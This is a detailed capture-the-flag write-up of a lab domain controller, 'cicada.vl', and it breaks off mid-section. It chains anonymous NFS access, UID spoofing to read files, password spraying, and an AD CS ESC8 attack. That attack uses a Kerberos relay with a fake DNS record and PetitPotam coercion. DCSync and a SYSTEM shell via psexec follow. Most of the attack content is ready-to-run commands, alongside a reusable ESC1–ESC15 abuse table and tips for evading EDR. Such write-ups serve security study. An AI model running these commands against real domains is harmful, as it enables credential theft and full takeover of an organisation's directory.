


**Full chain:**
NFS `/profiles` (no auth) → read a user's image via the **NFS UID trick** → **password** `Cicada123` → `rosie.powell` valid (**Kerberos only — NTLM disabled**) → BloodHound (rosie can reach **AD CS enrollment**) → **AD CS ESC8** via **Kerberos relay** (coerce the DC → relay to the CA web page → get a cert **as the DC machine account**) → **DCSync as DC$** → **Administrator** hash → **root**.

> This box has two big lessons: **(1) a Kerberos-only domain** (how to work when NTLM is off), and **(2) AD CS ESC8** (web-enrollment relay). Both are written out below in plain words with full why/when/how.


---

## Phase 1 — Enumerate

nmap says this is a **Domain Controller**: domain **cicada.vl**, host **DC-JPQ225.cicada.vl**, with **Kerberos/LDAP/SMB**, **Microsoft-IIS/10.0** + **Microsoft HTTPAPI httpd 2.0** (web), and — the interesting bit — **NFS**: `rpcbind` (111), `nfs` (2049), `mountd`, `nlockmgr`, `status`.

- `ffuf` on the web → nothing.
- A Windows DC running **NFS** is unusual and loud → that's the lead.

**What I learned #1** — NFS on a Windows DC = go there first. Windows can run "Services for NFS." When you see rpcbind/2049/mountd on a DC, enumerate the exports before anything else — it often leaks files with no auth.

---

## Phase 2 — NFS: list exports, mount, loot the profiles

List what's shared:

```bash
showmount -e 10.129.234.48
```

→ **`/profiles  (everyone)`**. "everyone" = no auth needed. Mount it:

```bash

sudo mkdir -p /mnt/nfs ; sudo mount -t nfs -o rw 10.129.234.48:/profiles /mnt/nfs
```

**What I learned #2** — "empty then suddenly full" = remount / stale handle. First mount showed nothing, a later look showed files. NFS mounts can show stale/cached state, or the first mount didn't attach cleanly. If a fresh NFS mount looks empty, unmount and remount (sudo umount /mnt/nfs then mount again), and confirm with mount | grep nfs. Don't assume "empty = nothing there."

**See everything at once** (don't crawl dir-by-dir):

```bash
ls -la /mnt/nfs/*
#or
find /mnt/nfs -ls
```

**What I learned #3** — enumerate wide, not one folder at a time. ls -la /mnt/nfs/* and find /mnt/nfs -ls dump the whole tree in one shot. I wasted time opening each user dir by hand — always start with a recursive listing.

**Users found** (each is a profile dir) → save as a username list for AD attacks later:

```
Administrator Joyce.Andrews  Richard.Gibbons  Katie.Ward  Jane.Carter  Debra.Wright
Jordan.Francis  Daniel.Marshall  Megan.Simpson  Rosie.Powell  Shirley.West
```

Two dir has a **`Documents`** folder (access denied) and an **image** (e.g. `marketing.png`).

**What I learned #4 — a user list IS loot.** On an AD box, valid usernames feed everything next: AS-REP roasting, password spraying, Kerberos user enum. Build the list now (`First.Last` here) even before you have a password.

### 🔧 Reference — turning real names into username guesses

Here the NFS folders gave the exact usernames (First.Last), so just list them:

```bash
printf '%s\n' Joyce.Andrews Richard.Gibbons Katie.Ward Jane.Carter Debra.Wright Jordan.Francis Daniel.Marshall Megan.Simpson Rosie.Powell Shirley.West > users.txt
```
But when you only have display names (e.g. from a website "Our Team" page, LinkedIn, a PDF) and must guess the AD format (flast, f.last, first.last, firstl…), use a generator:

username-anarchy (the main one — covers every common format):

```bash
username-anarchy -i names.txt > users.txt
```

(names.txt = one First Last per line)

namemash.py (classic alternative):

```bash
python3 namemash.py names.txt > users.txt
```

Then validate which format/users are real (so you spray a clean list): Kerberos user enum with Kerbrute:

```bash
kerbrute userenum -d cicada.vl --dc DC-JPQ225.cicada.vl users.txt
```

Valid names come back as "VALID USERNAME" — keep those, drop the rest, then spray the password.

**Dead end noted:** ran **exiftool** on the images (`sudo apt install libimage-exiftool-perl`) → nothing significant in the metadata. The payload is the **image content itself**, not EXIF. (Keep exiftool in mind for boxes where creds *are* hidden in metadata — just not this one.)

---

## Phase 3 — Reading the locked images (the NFS permission fight) 🔑

The images wouldn't open — file manager showed a **lock + X** icon, the viewer said **"Failed to open input stream for file."** That is **not a broken/encrypted file — it's just permissions.** Getting past it took three fixes. Here's the whole fight, in plain words.

**Core idea first:** NFS decides who can read a file by a **number (the UID)**, and *your computer tells the server what number you are*. So on your own Parrot box you can **pretend to be any UID** and read files the server thinks are private. `sudo` alone doesn't help, because NFS has **`root_squash`** — it turns your **root into "nobody"**, so root gets denied too. The move is always: **find the file's owner number, then become that number.**

### Problem 1 — I read the wrong number (size vs owner)

I thought the owner was `1832505`. It wasn't — that's the **file size**. In `ls -l` the columns are:

```
-rwx------+  1   65534   65534   1832505   Sep 13 2024  marketing.png
 perms      lnk  OWNER   group   SIZE      date         name
```

So the real owner was **`65534`** (= `nobody`). **Lesson:** owner is column **3**, size is column **5** — don't mix them. `ls -n` shows owner/group as plain numbers.

### Problem 2 — the `+` means a hidden ACL that overrides the normal permissions

Even after becoming `nobody` (65534), still **denied**. The clue was the **`+`** at the end of `-rwx------+`. That `+` means there's an **NFSv4 ACL** — an extra, hidden set of rules that **beats the normal `rwx` bits you see**. So "I match the owner" isn't enough; the ACL was still saying no. The `65534`/`nobody` owner is just NFSv4's way of saying *"I couldn't figure out which Windows user owns this."*

### Problem 3 (the fix) — drop to NFSv3 so it's pure numbers again
I **remounted the share as NFSv3**, which ignores the NFSv4 name-mapping and ACL and goes back to simple numeric UIDs:

```bash
sudo umount -f /mnt/nfs ; sudo mount -t nfs -o vers=3 10.129.234.48:/profiles /mnt/nfs ; ls -n /mnt/nfs/Rosie.Powell/
```

Now the owner showed as **`4294967294`** and the **`+` was gone**. `4294967294` = **-2** = the NFS **"anonymous"** owner. So I just had to **become UID 4294967294**:

```bash
sudo useradd -M -o -u 4294967294 nfsanon 2>/dev/null ; sudo -u nfsanon cp /mnt/nfs/Rosie.Powell/marketing.png /tmp/marketing.png ; sudo chown $USER /tmp/marketing.png ; xdg-open /tmp/marketing.png
```

(`-o` = allow a huge/non-standard UID; if `useradd` refuses it, add the user straight to `/etc/passwd` instead.) → image finally opens. 🎉

> **Annoying gotcha — `umount: device is busy`.** The **file-manager window was still open inside `/mnt/nfs/Rosie.Powell`**, which "holds" the mount so it won't unmount. Close that window (or `cd ~`) first. Anything sitting *inside* a mount keeps it busy.

Grab everything at once as the anonymous user (images **and** the Documents folders that were "locked"):

```bash
for d in /mnt/nfs/*/ ; do u=$(basename "$d"); sudo -u nfsanon cp "$d"*.png "/tmp/$u.png" 2>/dev/null ; sudo -u nfsanon cp -r "$d"Documents "/tmp/$u-Documents" 2>/dev/null ; done ; sudo chown -R $USER /tmp/*.png /tmp/*-Documents 2>/dev/null
```

### 🔎 NFS "can't read the file" — quick reference

**When you hit this:** a file on an NFS mount won't open / "permission denied" / "failed to open stream," even with `sudo`.

 **Why:** NFS trusts the **numeric UID your client sends**. The file is owned by some UID with `rwx------`; yours doesn't match → denied. `sudo` fails too because **`root_squash`** maps your root → nobody.

 
 **Fix — become the owner's number:**
 
1. `ls -n <dir>` → read the **owner UID** (column **3**, *not* the size in column 5).
 2. See a **`+`** on the perms, or owner shows as `65534`? That's an **NFSv4 ACL** hiding the real rules → **remount as v3**: `sudo mount -t nfs -o vers=3 <ip>:/share /mnt/nfs` → now you get the true numeric owner (often `4294967294` = anonymous).
 3. Make a local user with that exact UID (`sudo useradd -M -o -u <UID> x`) and copy **as that user** (`sudo -u x cp ...`). 
 
 **If it still fails:** `umount: device is busy` → something (file manager / your shell) is inside the mount — `cd ~` / close it. A copy made *as root* = empty/denied stream → redo as the owner UID. Want to see the real ACL rules: `nfs4_getfacl <file>`.

→ Open the images and **read the password** off them (a credential is shown in one of the pictures  likely a default/onboarding password), then take it to the AD steps below.

---

## Phase 4 — Validate the cred (and the `-k` lesson)

The image gave a password → spray it. **Gotcha:** plain (NTLM) auth returned **`STATUS_NOT_SUPPORTED`** — this DC has **NTLM disabled, Kerberos only**. Add `-k`:

```bash
nxc smb DC-JPQ225.cicada.vl -u users.txt -p 'Cicada123' -k --continue-on-success
```

→ **`rosie.powell : Cicada123`** ✅

### 🔎 `-k` (Kerberos) — when and why

 **`-k` = authenticate with Kerberos instead of NTLM.**
 - **`STATUS_NOT_SUPPORTED` on NTLM = NTLM is disabled on the target → you MUST use `-k`.** (Modern AD hardening; this box.)
 - **Don't always use `-k`** — default to NTLM (no flag); it's simpler and has no extra requirements. Switch to `-k` only when NTLM is refused, you're passing a ticket, or you specifically want Kerberos.

 - **Kerberos requirements (or it fails):**
   1. **Clock synced** with the DC or you get `KRB_AP_ERR_SKEW`. Sync tool = **`ntpdate`** (point it at the DC, by name or IP):

```bash
sudo ntpdate DC-JPQ225.cicada.vl      # or: sudo ntpdate 10.129.234.48
```
   
Not installed? `sudo apt install ntpdate -y`. Alternatives: `sudo rdate -n <ip>`, or `sudo ntpdate -u <ip>` (uses an unprivileged port if 123 is blocked). Check skew with `sudo ntpdate -q <ip>`.
  
   2. **Target the FQDN, not a raw IP** — tickets are tied to the host's name. Put it in `/etc/hosts`: `echo '<ip> DC-JPQ225.cicada.vl cicada.vl' | sudo tee -a /etc/hosts`.
   3. **Knock-on effect:** if NTLM is off, **every** later tool needs Kerberos too — impacket (`-k -no-pass` / tickets), bloodhound (`--kerberos`), GetUserSPNs, etc. Keep the FQDN + synced clock from here on.
---

## Phase 5 — Kerberos-only domain: set up ONCE, then everything works

Spraying the password worked **only with `-k`** → **NTLM is disabled, this domain speaks only Kerberos.** Kerberos is fussy, and *all* the weird errors I hit (`Empty Domain`, `Name or service not known`, `KDC_ERR_S_PRINCIPAL_UNKNOWN`) were just Kerberos being strict. The fix is a one-time setup, then every tool reuses a **ticket**.

```bash
echo '10.129.234.48 dc-jpq225.cicada.vl cicada.vl DC-JPQ225' | sudo tee -a /etc/hosts   # names must resolve

sudo ntpdate dc-jpq225.cicada.vl                                                         # clock must match the DC

impacket-getTGT cicada.vl/rosie.powell:'Cicada123' -dc-ip 10.129.234.48                  # get a Kerberos ticket (TGT)

export KRB5CCNAME=$(pwd)/rosie.powell.ccache                                              # tell every tool to USE that ticket
```

Now tools just work with **`-k -no-pass`** ("use my cached ticket"):

```bash
nxc smb dc-jpq225.cicada.vl -u rosie.powell -p 'Cicada123' -k --shares

impacket-smbclient -k -no-pass @dc-jpq225.cicada.vl

bloodyAD -k --host dc-jpq225.cicada.vl -d cicada.vl --dc-ip 10.129.234.48 get writable
```


### 🔎 KERBEROS-ONLY DOMAIN — quick reference (read this when NTLM is off)

 **How do I know NTLM is off:** a plain (no `-k`) login returns **`STATUS_NOT_SUPPORTED`**, or nxc's banner shows **`(NTLM:False)`**. From then on, **every** tool needs Kerberos.

 **The 4 setup steps (do once):**
 
 1. **Names must resolve** → put the DC's FQDN in `/etc/hosts`. (Error if you skip: `Name or service not known`.)
 2. **Clock must match the DC** → `sudo ntpdate <dc-fqdn>`. (Error if you skip: `KRB_AP_ERR_SKEW`.)
 3. **Get a ticket** → `impacket-getTGT DOMAIN/user:'pass' -dc-ip <ip>` → makes a `user.ccache` file.
 4. **Point tools at the ticket** → `export KRB5CCNAME=$(pwd)/user.ccache`.

 **The golden rules that stop 90% of Kerberos errors:**
 
 - **Always target the FQDN, NEVER the raw IP.** A ticket is tied to the host's *name* (`cifs/dc-jpq225.cicada.vl`), not an IP. (Error if you use IP: `KDC_ERR_S_PRINCIPAL_UNKNOWN`.)
 - **Always include the domain** in impacket targets: `cicada.vl/rosie.powell:...`. (Error if you skip: `Empty Domain not allowed`.)
 - **`-dc-ip <ip>`** tells the tool where the KDC *is* (the IP), while the *target* stays the FQDN. Both at once is normal.

 **"Why does it work now?" (random timeouts):** `NETBIOS connection timed out` on one run then fine the next = **transient VPN/lab lag**, not your mistake. Just re-run. Not case-sensitivity.

 **⚠️ "I had `-k` AND added the host to `/etc/hosts` — why STILL errors?"** Because `-k` + hosts fix *protocol + resolution*, but each error below is a **separate mistake** they don't cover:
 
 - **`Empty Domain not allowed`** → you left the **domain** out of the target. Must be `cicada.vl/rosie.powell:...`, not `rosie.powell:...`. (`-k` can't add a domain you didn't type.)
 - **`Name or service not known`** → you used a **UNC path** (`//host/share`) as the target. That's not impacket's format — use `DOMAIN/user:pass@host` and pick the share *after* connecting.
 - **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** → you put the **IP after `@`**. Kerberos builds the service name (SPN) from the **literal text after `@`**; an IP (`cifs/10.129.234.48`) has **no SPN** → fails. `/etc/hosts` only makes the *name resolve* — it does **not** let Kerberos use an IP. **You must actually TYPE the FQDN in the target.**
 - **The split to remember:** the **name/FQDN** = *who* you authenticate to (Kerberos finds the SPN from it); the **IP** belongs **only** in `-dc-ip` = *where to send packets*. Having the FQDN in hosts is step 1; **using** the FQDN (not the IP) in the command is step 2 — do both.
 
  ✅ all-correct: `impacket-smbclient -k cicada.vl/rosie.powell:'Cicada123'@dc-jpq225.cicada.vl -dc-ip 10.129.234.48`


---

## Phase 6 — BloodHound: find the path (and a group you can't abuse)

Collect with Kerberos, mark rosie owned:

```bash
bloodhound-python -u rosie.powell -p 'Cicada123' -d cicada.vl -ns 10.129.234.48 --dns-tcp -c All --zip -k
```

What it showed:
- **rosie → `cicada` group → dead end** (that path goes nowhere).
- **Daniel & Debra are Domain Admins with DCSync** → that's the **goal** (become one of them / replicate secrets).
- The useful path for rosie: **Domain Users → Authenticated Users → `Certificate Service DCOM Access`** → i.e. rosie can **talk to AD CS and enroll for certificates**. That's the door in.

**⚠️ The trap I wasted time on — "add rosie to Authenticated Users / DCOM group."** You **cannot add members** to **Authenticated Users** or **Domain Users** — they're **automatic, system-managed** groups. Windows puts you in them just for *being logged in*; no admin (and no attacker) adds people manually. That's why bloodyAD errored. **And rosie is ALREADY in them**, so she already has the AD CS enrollment access — nothing to add. **Lesson: if a BloodHound edge runs through "Authenticated Users"/"Domain Users"/"Everyone", you already have it — don't try to grant it.**

---

## Phase 7 — AD CS: find what's vulnerable (certipy find)

rosie's share crawl showed a readable **`CertEnroll`** share and **certificate templates** → this is an **Active Directory Certificate Services (AD CS)** box. Enumerate with **certipy** (ticket already loaded from Phase 5):

```bash
certipy find -k -no-pass -target dc-jpq225.cicada.vl -ns 10.129.234.48 -vulnerable -stdout
```

→ it flags **ESC8**: the CA has **Web Enrollment over HTTP enabled** (a web page at `http://<ca>/certsrv/` that hands out certificates and accepts Windows logins).

**What AD CS even is (plain words):** AD CS is the domain's **ID-card office**. It issues **certificates**, and in AD a certificate can be used to **log in as whoever it's made out to**. So if you can trick the office into making you a card **with someone else's name on it** (like a Domain Admin or the DC), you can then log in **as them**. Every "ESCx" is a different way to trick the office.

### The path /certsrv/certfnsh.asp is a FIXED Microsoft standard, not a guess

You’re not assuming — **every** Windows AD CS “Web Enrollment” role uses the **same built-in URLs**. They’re hardcoded by Microsoft, identical on every box:

- `http://<ca>/certsrv/` → the web-enrollment home page
- `http://<ca>/certsrv/certrqxt.asp` → request a cert (the form)
- `http://<ca>/certsrv/**certfnsh.asp**` → **submits/finalizes** the request ← this is the one relay tools hit

So once `certipy find` tells you **Web Enrollment: HTTP Enabled**, you already know the path — it’s always `certfnsh.asp`. You can confirm it exists by browsing `http://<ca>/certsrv/` (it’ll prompt for a Windows login). Bonus: most tools (`certipy relay`, krbrelayx `--adcs`) **default to this path**, so often you don’t even type it.


---

## Phase 8 — Exploit **ESC8** (the hard part: NTLM is off → **Kerberos relay**)

**ESC8 in plain words:** the ID-card office has a **website** (`http://<ca>/certsrv/`) where a *Windows account* can log in and ask for a certificate. The attack isn't about *your* login — it's about **catching a powerful account's login and forwarding (relaying) it to that website**, so the office makes a certificate **for them**. The juiciest account to catch is the **Domain Controller's computer account (`DC-JPQ225$`)**, because a DC can **DCSync** (read everyone's password hashes).

**Normal ESC8 = NTLM relay.** But **NTLM is disabled here**, so you can't do the usual NTLM relay. You have to do the harder **Kerberos relay** ([synacktiv technique](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html)).

**The clever bit — the "fake DNS name" trick (CredMarshalTargetInfo):** Kerberos tickets are locked to a **name**, and normally you can't relay them because the name must match the real service. The trick: you register a **special DNS name** that has hidden marker data glued on. When Windows builds the Kerberos ticket, it **strips that marker and ends up asking for a ticket to the *real* CA service** — but **DNS still points that whole name at YOUR machine**. Result: the DC gets a valid ticket *for the CA*, but **sends it to you**, and you forward it to the real CA. (Think: an envelope correctly addressed to the bank, but the mail carrier is told your house *is* the bank.)

**The crafted "fake name":** it's the **DC's short name + a marshaled blob** (the CredMarshalTargetInfo marker). On this box it was `DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` — i.e. `DC-JPQ225` + `1UWhRC...` (the marker). Kerberos strips the `1UWhRC...` part and asks for a ticket to the real `DC-JPQ225`, but DNS sends the whole name to you.

**The chain (verified commands — needs 3 terminals):**

```bash
# 1) Add the fake DNS name pointing at YOUR IP (bloodyAD, with Kerberos)
bloodyAD -k --host DC-JPQ225.cicada.vl -d cicada.vl -u Rosie.Powell -p 'Cicada123' add dnsRecord "DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" <YOUR-IP>
#    verify it resolves to you:  dig @10.129.234.48 DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl A

# 2) Start the Kerberos relay → CA web-enrollment page, asking for a DomainController cert for DC-JPQ225$
sudo python3 krbrelayx.py -t 'http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC-JPQ225$'

# 3) Coerce the DC to authenticate to the fake name (NetExec coerce_plus → PetitPotam)
nxc smb 10.129.234.48 -u Rosie.Powell -p 'Cicada123' -d cicada.vl -k -M coerce_plus -o LISTENER="DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" METHOD=Petitpotam
```

→ krbrelayx catches the DC's Kerberos auth, relays it to the CA web page (`200 OK`), and **saves a certificate for `DC-JPQ225$`** → `DC-JPQ225.pfx`.

**Note on the fake-name string:** the `1UWhRC...` marshaled part is **specific to the DC name** — it's generated from the target info, not something you can freely invent. Tools/the [synacktiv article](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html) show how to build it. (`certipy relay` is the simpler built-in path but **timed out here** — that's why the manual krbrelayx route was used.)

 **How do I know ESC8 is the move (and not ESC1 etc.)?** certipy said **Web Enrollment: HTTP Enabled** and there was **no template where *I* could supply the SAN** (that'd be ESC1). When the only lever is "the CA has a web login page," ESC8 (relay) is the play. **Why Kerberos relay and not NTLM relay?** Because NTLM was disabled (`NTLM:False`) — the normal ESC8 relay is NTLM, so here you *must* use the Kerberos variant with the fake-DNS trick.

### 🩹 Real-world troubleshooting — everything that broke (and the fix)

This attack fought me for hours. Every wall, in order:

**1. krbrelayx: `ModuleNotFoundError: No module named 'lib'`** — I only copied `krbrelayx.py`; it needs the rest of its repo. Clone the whole thing and run from INSIDE the folder:

```bash
git clone https://github.com/dirkjanm/krbrelayx.git ; cd krbrelayx ; sudo python3 krbrelayx.py ...
```

**2. `--interface-ip` must be MY tun0 IP, not the DC.** `Cannot assign requested address` = I gave an IP my machine doesn't own. **IP cheat-sheet:** `--interface-ip` + the DNS-record value = **ME** (10.10.15.249); `-dc-ip` / target / `dig @` = **the DC**. Never mix them.

**3. `Address already in use` (ports 53 / 80 / 445):**
- 53 = my own `systemd-resolved`, 80 = a leftover `python3 -m http.server`. Fix: `--interface-ip <my-tun0>` binds only tun0 and dodges resolved. For SMB coercion I only need the SMB server (445) anyway.
- 445 held by something → `sudo ss -tlnp | grep ':445'` → kill it. **Kill by PID with `kill <PID>`, NOT `pkill <PID>`** — `pkill` wants a NAME, not a number (`pkill -f krbrelayx` works; `pkill 12345` does nothing). Host Samba also grabs 445: `sudo systemctl stop smbd nmbd`.

**4. krbrelayx showing connections from random internet IPs** (`Received connection from 103.x / 81.x`, `Unsupported MechType NTLMSSP`) = internet scanners hitting my PUBLIC IP — pure noise. I'm waiting for a connection from the **DC's IP** only. `--interface-ip <tun0>` silences them.

**5. The DNS record must resolve to ONLY my IP.** `dig +short @<DC-IP> <fake-name>.cicada.vl` kept returning BOTH my IP and the DC's IP → the DC round-robins, so half my coercions went to the DC itself and missed krbrelayx. The DC-IP value was a **stale DNS cache** bloodyAD couldn't even see (`Record not found` on remove). Fixes: remove both values and re-add only mine; OR just **coerce in a loop** until it randomly picks my IP; OR (cleanest) a **fresh instance** wipes the cache. Goal: `dig` returns **only** my tun0 IP.

**Success looks like (krbrelayx terminal):** `SMBD: Received connection from <DC-IP>` → `GOT CERTIFICATE! ID 90`.

**6. `GOT CERTIFICATE!` then a crash: `module 'OpenSSL.crypto' has no attribute 'PKCS12'`.** The cert WAS issued — only the packaging into a `.pfx` failed. impacket's `adcsattack.py` uses the old pyOpenSSL `crypto.PKCS12()`, **removed in pyOpenSSL ≥ 23**. **Don't downgrade pyOpenSSL (it breaks certipy)** — patch the function instead:

```bash
sudo python3 - <<'EOF'
f='/usr/lib/python3/dist-packages/impacket/examples/ntlmrelayx/attacks/httpattacks/adcsattack.py'
s=open(f).read()
old='''    def generate_pfx(self, key, certificate):
        certificate = crypto.load_certificate(crypto.FILETYPE_PEM, certificate)
        p12 = crypto.PKCS12()
        p12.set_certificate(certificate)
        p12.set_privatekey(key)
        return p12.export()'''
new='''    def generate_pfx(self, key, certificate):
        from cryptography.hazmat.primitives.serialization import pkcs12, NoEncryption
        from cryptography.x509 import load_pem_x509_certificate
        certificate = load_pem_x509_certificate(certificate.encode() if isinstance(certificate, str) else certificate)
        return pkcs12.serialize_key_and_certificates(
            name=b"", key=key.to_cryptography_key(), cert=certificate, cas=None,
            encryption_algorithm=NoEncryption())'''
open(f,'w').write(s.replace(old,new)) if old in s else print("[-] block not found")
print("[+] Patched")
EOF
```

(Two bugs in one: the removed `PKCS12`, AND `certificate` arrives as a **str** so `load_pem_x509_certificate` needs `.encode()` to bytes.) Re-run relay + coerce once → no crash.

**7. Where's the pfx?** Saved in krbrelayx's own folder (`~/krbrelayx/`), named **`DC-JPQ225$.pfx`** — WITH the `$`. Quote it (`'DC-JPQ225$.pfx'`) so bash doesn't eat the `$`.

> **Lesson:** `GOT CERTIFICATE!` then a crash = the cert exists, only *packaging* failed — fix the serialization and **re-fire once**, don't redo the whole chain. And a cert is stale if the box **respawned** (new IP) — it was signed by the old instance's CA, so redo the relay on the live IP.

---

## Phase 9 — Turn the DC cert into Administrator → root

The certificate is for the **DC machine account**, and a DC is allowed to **DCSync** (pull any user's password hash from AD). So (verified commands):

```bash
# 1) cert → DC$'s NT hash + a ticket   (NOTE the $ in the filename — single-quote it!)
certipy auth -pfx 'DC-JPQ225$.pfx' -dc-ip 10.129.88.36
export KRB5CCNAME=$(pwd)/dc-jpq225.ccache

# 2) DCSync as DC$ (it has replication rights) → dump the Administrator hash
impacket-secretsdump -k -no-pass -just-dc-user Administrator cicada.vl/'dc-jpq225$'@dc-jpq225.cicada.vl -dc-ip 10.129.88.36

# 3) NTLM is OFF → you CANNOT pass-the-hash directly (evil-winrm -H / psexec -hashes both FAIL).
#    Turn the Administrator hash into a Kerberos ticket first:
impacket-getTGT cicada.vl/administrator -hashes :<ADMIN_NT_HASH> -dc-ip 10.129.88.36
export KRB5CCNAME=$(pwd)/administrator.ccache
klist                                   # confirm the ticket is loaded

# 4) Log in as Administrator OVER KERBEROS → SYSTEM shell on the DC → root.txt
impacket-psexec -k -no-pass cicada.vl/administrator@dc-jpq225.cicada.vl -dc-ip 10.129.88.36
#    (evil-winrm -i dc-jpq225.cicada.vl -r cicada.vl  also works with the ticket loaded)
```

**Administrator → SYSTEM on the DC.** 👑 Box done.

> ⚠️ **NTLM-off LOGIN gotcha (this bit me at the finish line).** `evil-winrm -H <hash>` and `impacket-psexec -hashes <hash>` both use **NTLM pass-the-hash** — which a Kerberos-only domain **refuses** (evil-winrm throws a weird `Error: unknown type: ... / ArgumentError`, psexec fails pre-auth). The fix is always the same: **`getTGT` with the hash → `export KRB5CCNAME` → log in with `-k -no-pass`.** Convert the hash into a ticket; never try to pass it as NTLM.

**🐚 psexec vs wmiexec — which shell?** 

> - **psexec** → uploads a service binary → **full interactive shell as `NT AUTHORITY\SYSTEM`** (even above Administrator). **Noisy:** drops a file on disk + creates/deletes a service → AV/EDR and logs catch it.
> - **wmiexec** → **no disk artifact, stealthier**, runs as the user (Administrator, not SYSTEM), but **semi-interactive** (each command spawns a fresh `cmd` — no real shell, no persistent `cd`).
> - **Rule:** lab box / shell quality matters → **psexec** (better shell + SYSTEM). Real engagement with EDR → **wmiexec** (quieter). Same choice applies to `smbexec`/`atexec` too.

### Grab the flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

> **Why the DC account = game over:** Domain Controllers have **replication rights** (the DCSync privilege) so they can sync the AD database between each other. If *you* hold the DC's identity (via its cert), you can ask AD, "replicate me the Administrator hash," and it complies. That's why stealing the **DC machine account** is as good as Domain Admin.

---

## 🧭 Full chain (one glance)

```
NFS /profiles (no auth) ─► read image as anon UID ─► password "Cicada123"
      │
      ▼  (domain is KERBEROS-ONLY: getTGT + KRB5CCNAME + FQDN + synced clock)
rosie.powell valid ─► BloodHound ─► rosie can reach AD CS enrollment (via Authenticated Users)
      │
      ▼  certipy find ─► ESC8 (CA web enrollment over HTTP)
Kerberos relay (fake DNS name) ─► coerce DC ─► relay to CA web page ─► cert for DC-JPQ225$
      │
      ▼  certipy auth ─► DCSync as DC$ ─► Administrator hash ─► getTGT ─► psexec -k
                         NT AUTHORITY\SYSTEM on the DC  👑
```

## Takeaways (the reusable lessons)

1. **NFS on a Windows DC → enumerate exports first** (`showmount -e`); `(everyone)` = no auth. Use `ls -la /mnt/nfs/*` / `find -ls` to see it all at once; **mount looks empty → remount**.
2. **NFS = trust by UID number.** Can't read a file? `ls -n` for the owner (**column 3, not the size!**), become that UID. A `+`/owner `65534` = hidden NFSv4 ACL → **remount `-o vers=3`** → true numeric owner (often `4294967294` = anonymous) → impersonate it. `root_squash` is why `sudo` fails. `umount busy` = something's inside the mount.
3. **A username list is loot** — the profile folders *were* the usernames (`First.Last`). For guesses from display names: `username-anarchy` / `namemash.py`, then `kerbrute userenum` to confirm.
4. **Kerberos-only domain (`NTLM:False` / `STATUS_NOT_SUPPORTED`):** do the one-time setup — **hosts + ntpdate + getTGT + `KRB5CCNAME`** — then every tool uses `-k -no-pass`. **Always FQDN, never IP; always include the domain; `-dc-ip` for where the KDC is.**
5. **BloodHound edges through Authenticated Users / Domain Users / Everyone = you already have it.** Don't try to "add" yourself — those groups are automatic.
6. **AD CS = the ID-card office.** `certipy find -vulnerable -stdout` names the ESC; the **ESC cheat-sheet table** above says how to abuse each. Match the ESC to the preconditions you actually meet.
7. **ESC8 = relay a login to the CA's web page.** If NTLM is off, use the **Kerberos relay** (fake-DNS / CredMarshalTargetInfo + krbrelayx) and target the **DC machine account** — because **a DC can DCSync**, so its cert → Administrator's hash → root.
8. **Password > hash, cert ≈ identity.** A cert in AD *is* a login; stealing the DC's cert = owning the domain.
9. **NTLM-off = no pass-the-hash.** `evil-winrm -H` / `psexec -hashes` FAIL on a Kerberos-only domain. Always: **`getTGT` with the hash → `export KRB5CCNAME` → log in with `-k -no-pass`.** Turn the hash into a ticket.
10. **krbrelayx `generate_pfx` crash** (`OpenSSL.crypto has no attribute 'PKCS12'`) = the cert was issued, only packaging failed. Patch `adcsattack.py` (pyOpenSSL ≥23 dropped PKCS12; **don't downgrade** — breaks certipy). The pfx lands in `~/krbrelayx/` as **`DC-JPQ225$.pfx`** (with the `$`). Fix serialization → re-fire once.
11. **`kill <PID>` vs `pkill <name>`.** `pkill` takes a name/pattern, never a number — `pkill -f krbrelayx` ✅, `pkill 12345` ❌ (use `kill 12345`).
12. **psexec vs wmiexec:** psexec = full SYSTEM shell but noisy (service + file on disk); wmiexec = stealthy but semi-interactive, runs as the user. Lab → psexec; EDR → wmiexec.

---

# 📎 Extra Notes — AD CS attack reference (standalone, reuse on any box)

## Step 0 — always run this first (any AD CS box)

```bash
certipy find -u user@domain -p 'pass' -dc-ip <ip> -vulnerable -stdout
#   Kerberos-only domain? add: -k -no-pass  (after getTGT + export KRB5CCNAME)
```

It prints **which ESC** applies and the CA/template details. Then match it below.

## The ESC map — which trick, how you know, how to abuse

| ESC | Plain meaning | Tell-tale in `certipy find` | Abuse |
|---|---|---|---|
| **ESC1** | You choose the name on the cert (SAN) | `Enrollee Supplies Subject: True` + Client Auth + Enroll | `certipy req ... -template X -upn administrator@dom` → `certipy auth` |
| **ESC2** | Cert works for anything (Any Purpose EKU) | `Any Purpose` EKU | request → use like ESC1 |
| **ESC3** | Enrollment-Agent cert (request *for* others) | `Certificate Request Agent` EKU | get agent cert → `-on-behalf-of 'dom\\administrator'` |
| **ESC4** | You can edit a template | WriteOwner/WriteDacl on template | rewrite into ESC1, then abuse (see [[tombwatcher-htb-writeup]] style) |
| **ESC6** | CA lets anyone set SAN | `User Specified SAN: Enabled` | any template + `-upn administrator` |
| **ESC7** | You control the CA (ManageCA) | CA perms show ManageCA/Certificates | flip ESC6 flag / approve your own request |
| **ESC8** | CA **web enrollment over HTTP** → relay | `Web Enrollment: HTTP Enabled` | coerce + **relay** a privileged login to the CA → cert as them |
| **ESC9/10** | Weak cert→user mapping | certipy flags it | UPN manipulation → map to admin |
| **ESC11** | Relay to CA **RPC** (ICPR) | — | like ESC8 over RPC |
| **ESC15 (EKUwu)** | Inject App Policies on v1 template | `Schema Version: 1` + Enroll | `certipy req ... -application-policies ...` (done on **Tombwatcher**) |

## Generic ESC1-style cert → admin (the common case)

```bash
certipy req -u user@dom -p 'pass' -dc-ip <ip> -ca '<CA-NAME>' -template '<VULN-TEMPLATE>' -upn administrator@dom
certipy auth -pfx administrator.pfx -dc-ip <ip>        # → admin TGT + NT hash
```

## ESC8 (relay) — the two flavors

#### 1. **NTLM on (normal):** 

No DNS tricks, no krbrelayx. The `LISTENER` is just **your plain IP**.

**Terminal 1 — relay listener (certipy):**

```bash
